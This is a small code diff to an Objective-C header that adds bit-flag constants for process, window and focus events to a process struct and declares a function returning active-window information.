@@ -363,7 +363,11 @@ typedef struct _timer {
 
 typedef struct _process {
   u_int onClose;
-  u_int lookForTitle; // 1 for Title - 0 for Process Name
+  u_int lookForTitle;
+  // First bit = 1 Window, 0 Process; Second bit = 1 Focus
+#define EVENT_PROCESS_ON_PROC   0x00000000
+#define EVENT_PROCESS_ON_WINDOW 0x00000001
+#define EVENT_PROCESS_ON_FOCUS  0x00000002
   char name[256];
 } processStruct;
 
@@ -710,6 +714,8 @@ void printFormatFlags(AudioStreamBasicDescription inDescription);
 #endif
 
 size_t _utf16len(unichar *string);
+
+NSDictionary *getActiveWindowInfo();
 
 #ifdef DEMO_VERSION
 void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
